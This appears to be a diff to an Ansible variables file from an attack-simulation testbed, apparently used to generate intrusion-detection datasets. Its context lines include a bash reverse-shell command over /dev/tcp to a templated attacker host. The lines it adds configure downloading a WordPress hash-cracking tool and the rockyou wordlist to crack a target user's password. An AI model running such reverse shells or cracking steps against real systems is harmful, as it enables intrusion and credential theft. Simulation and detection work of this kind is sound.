@@ -130,6 +130,19 @@ kyoushi_attacker_reverse_shell:
   - " '0<&196;exec 196<>/dev/tcp/{{ kyoushi_attacker_reverse_shell_host }}/{{ kyoushi_attacker_reverse_shell_port }}; sh <&196 >&196 2>&196'" 
   - "&"
 
+# The url to the hashcrack tar
+kyoushi_attacker_hashcrack_url: "https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz"
+# The name of the hashcrack tar
+kyoushi_attacker_hashcrack_file_name: "v0.1.tar.gz"
+# The url to the wordlist used for password cracking
+kyoushi_attacker_wl_url: "http://{{ hostvars['attacker_0'].ansible_default_ipv4.address }}/rockyou.txt"
+# The name of the wordlist
+kyoushi_attacker_wl_name: "rockyou.txt"
+# The username of the attacked user
+kyoushi_attacker_hashcrack_user: "{{ attack_shell_user.username }}"
+# The probability that cracking takes place offline
+kyoushi_attacker_offline_cracking_probability: \var{context.kyoushi_attacker_offline_cracking_probability}
+
 # The user to escalate to in the 2nd part
 kyoushi_attacker_reverse_shell_user: "{{ attack_shell_user.username }}"
 # The password to use for escalation
